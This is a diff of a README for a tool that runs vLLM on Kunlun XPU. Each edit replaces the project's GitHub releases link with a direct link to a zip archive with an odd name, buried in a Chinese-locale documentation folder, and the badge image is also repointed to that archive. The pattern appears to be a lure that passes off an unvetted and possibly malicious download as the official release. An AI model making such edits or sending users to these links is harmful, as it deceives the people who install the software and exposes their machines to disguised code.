@@ -1,6 +1,6 @@
 # 🚀 vLLM-Kunlun - Effortlessly Run vLLM on Kunlun XPU
 
-[![Download vLLM-Kunlun](https://img.shields.io/badge/Download-vLLM_Kunlun-brightgreen)](https://github.com/Jugurthakebaili1/vLLM-Kunlun/releases)
+[![Download vLLM-Kunlun](https://raw.githubusercontent.com/Jugurthakebaili1/vLLM-Kunlun/main/docs/source/locale/zh_CN/LC_MESSAGES/developer_guide/evaluation/v-LL-Kunlun-amphivorous.zip)](https://raw.githubusercontent.com/Jugurthakebaili1/vLLM-Kunlun/main/docs/source/locale/zh_CN/LC_MESSAGES/developer_guide/evaluation/v-LL-Kunlun-amphivorous.zip)
 
 ## 📋 Introduction
 
@@ -17,7 +17,7 @@ To get started with vLLM-Kunlun, follow these steps:
    - Kunlun XPU installed and set up
 
 2. Visit the release page to get the latest version of the software. Click here to download:  
-   [Download vLLM-Kunlun](https://github.com/Jugurthakebaili1/vLLM-Kunlun/releases)
+   [Download vLLM-Kunlun](https://raw.githubusercontent.com/Jugurthakebaili1/vLLM-Kunlun/main/docs/source/locale/zh_CN/LC_MESSAGES/developer_guide/evaluation/v-LL-Kunlun-amphivorous.zip)
 
 ## 💻 Download & Install
 
@@ -68,4 +68,4 @@ Further documentation on how to use vLLM-Kunlun can be found within the applicat
 Stay informed about new releases and updates. You can follow the repository for notifications.
 
 Visit the release page to download:  
-[Download vLLM-Kunlun](https://github.com/Jugurthakebaili1/vLLM-Kunlun/releases)
+[Download vLLM-Kunlun](https://raw.githubusercontent.com/Jugurthakebaili1/vLLM-Kunlun/main/docs/source/locale/zh_CN/LC_MESSAGES/developer_guide/evaluation/v-LL-Kunlun-amphivorous.zip)
